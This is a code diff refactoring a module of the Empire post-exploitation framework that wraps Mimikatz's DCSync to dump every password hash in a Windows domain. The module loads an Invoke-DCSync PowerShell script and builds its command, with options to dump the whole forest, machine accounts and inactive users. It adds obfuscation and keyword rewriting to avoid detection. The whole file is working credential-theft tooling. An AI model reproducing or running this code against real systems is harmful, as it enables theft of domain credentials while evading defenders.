@@ -1,125 +1,50 @@
 from __future__ import print_function
 
-from builtins import object
 from builtins import str
-
+from builtins import object
 from empire.server.common import helpers
+from typing import Dict
+
+from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
-
-    def __init__(self, mainMenu, params=[]):
-
-        self.info = {
-            'Name': 'Invoke-Mimikatz DCsync - Full Hashdump',
-
-            'Author': ['@gentilkiwi', 'Vincent Le Toux', '@JosephBialek', "@harmj0y", "@monoxgas"],
-
-            'Description': ("Runs PowerSploit's Invoke-Mimikatz function "
-                            "to collect all domain hashes using Mimikatz's"
-                            "lsadump::dcsync module. This doesn't need code "
-                            "execution on a given DC, but needs to be run from"
-                            "a user context with DA equivalent privileges."),
-
-            'Software': 'S0002',
-
-            'Techniques': ['T1098', 'T1003', 'T1081', 'T1207', 'T1075', 'T1097', 'T1145', 'T1101', 'T1178'],
-
-            'Background' : True,
-
-            'OutputExtension' : None,
-            
-            'NeedsAdmin' : False,
-
-            'OpsecSafe' : True,
-
-            'Language' : 'powershell',
-
-            'MinLanguageVersion' : '2',
-            
-            'Comments': [
-                'http://blog.gentilkiwi.com',
-                'http://clymb3r.wordpress.com/'
-            ]
-        }
-
-        # any options needed by the module, settable during runtime
-        self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Agent' : {
-                'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Computers' : {
-                'Description'   :   'Switch. Include machine hashes in the dump',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'Domain' : {
-                'Description'   :   'Specified (fqdn) domain to pull for the primary domain/DC.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'Forest' : {
-                'Description'   :   'Switch. Pop the big daddy (forest) as well.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'Active' : {
-                'Description'   :   'Switch. Only collect hashes for accounts marked as active. Default is True',
-                'Required'      :   False,
-                'Value'         :   ''
-            }
-        }
-
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]['Value'] = value
-
-    def generate(self, obfuscate=False, obfuscationCommand=""):
-        
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
         # read in the common module source code
-        moduleSource = self.mainMenu.installPath + "/data/module_source/credentials/Invoke-DCSync.ps1"
+        module_source = main_menu.installPath + "/data/module_source/credentials/Invoke-DCSync.ps1"
         if obfuscate:
-            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
-            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
+            helpers.obfuscate_module(moduleSource=module_source, obfuscationCommand=obfuscation_command)
+            module_source = module_source.replace("module_source", "obfuscated_module_source")
         try:
-            f = open(moduleSource, 'r')
+            f = open(module_source, 'r')
         except:
-            print(helpers.color("[!] Could not read module source path at: " + str(moduleSource)))
+            print(helpers.color("[!] Could not read module source path at: " + str(module_source)))
             return ""
 
-        moduleCode = f.read()
+        module_code = f.read()
         f.close()
 
-        script = moduleCode
+        script = module_code
 
-        scriptEnd = "Invoke-DCSync -PWDumpFormat "
+        script_end = "Invoke-DCSync -PWDumpFormat "
 
-        if self.options["Domain"]['Value'] != '':
-            scriptEnd += " -Domain " + self.options['Domain']['Value']
+        if params["Domain"] != '':
+            script_end += " -Domain " + params['Domain']
 
-        if self.options["Forest"]['Value'] != '':
-            scriptEnd += " -DumpForest "
+        if params["Forest"] != '':
+            script_end += " -DumpForest "
 
-        if self.options["Computers"]['Value'] != '':
-            scriptEnd += " -GetComputers "
+        if params["Computers"] != '':
+            script_end += " -GetComputers "
 
-        if self.options["Active"]['Value'] == '':
-            scriptEnd += " -OnlyActive:$false "
+        if params["Active"] == '':
+            script_end += " -OnlyActive:$false "
 
-        scriptEnd += "| Out-String;"
+        script_end += "| Out-String;"
         if obfuscate:
-            scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
-        script += scriptEnd
+            script_end = helpers.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=obfuscation_command)
+        script += script_end
         script = helpers.keyword_obfuscation(script)
 
         return script
